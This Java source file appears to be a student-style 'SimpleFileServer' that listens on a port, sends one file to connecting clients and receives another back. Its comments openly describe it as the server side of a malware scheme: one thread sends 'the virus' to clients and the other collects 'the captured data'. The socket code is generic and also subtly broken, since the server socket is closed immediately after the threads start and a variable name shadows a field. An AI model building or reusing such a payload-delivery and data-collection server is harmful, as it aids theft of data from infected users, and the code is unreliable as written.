package SERVER;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;



public class SimpleFileServer {

  public final static int SOCKET_PORT = 13267;  // you may change this
  public final static String FILE_TO_SEND = "Calculator_Server/Program.txt";  // you may change this
  public final static String FILE_TO_RECEIVED = "Calculator_Server/Program_receptionat_Delacilent.txt";
  public final static int FILE_SIZE = 6022386;  // file size temporary hard coded
  												// should bigger than the file to be downloaded
  
  ///***Variable fot SEND ***\\\
  protected FileInputStream fis = null;
  protected static BufferedInputStream bis = null;
  protected static OutputStream os = null;
  protected static ServerSocket servsock = null;
  protected static Socket sock = null;
 
  static SendFile send = new SendFile();
 
  ///***Variable fot RECIVE ***\\\
  protected int bytesRead;
  protected int current = 0;
  protected static FileOutputStream fos = null;
  protected static BufferedOutputStream bos = null;

  static ReciveFile recive = new ReciveFile();
  
  
  
  
  public void  WaitConnect() throws IOException {
    
    try {
    	//Create's a new tread that it used to send the virus to the client
    	Thread send = new Thread(new Runnable() {
			public void run() {
				try {
					SendFile();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		});
        
    	//Create's a new tread that it's used to receive the captured data from the client.
    	Thread recive = new Thread(new Runnable() {
			public void run() {
				try {
					ReciveFile();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		});
          
    	send.start();
    	recive.start();
    }
    finally {
      if (servsock != null) servsock.close();
    }
  }
  

		///*** SendFile***\\\
	  public synchronized void SendFile() throws IOException{
		  servsock = new ServerSocket(SOCKET_PORT);
	      while (true) { 
	    	
	        System.out.println("Waiting...");
	        try {
	          sock = servsock.accept();
	          System.out.println("Accepted connection : " + sock);
	          
	          send.Sending();
	         
	        }
	        finally {
	          if (bis != null) bis.close();
	          if (os != null) os.close();
	          if (sock!=null) sock.close();
	        }
	      }
	  }
	      
      ///*** ReciveFiel***\\\
      public synchronized void ReciveFile() throws IOException{
    	
          System.out.println("Waiting...");
          try {
            sock = servsock.accept();
            System.out.println("Accepted connection : " + sock);
          
            recive.Reciving();
             
          }
          finally {
            if (bis != null) bis.close();
            if (os != null) os.close();
            if (sock!=null) sock.close();
          }
      }
  
  
  
}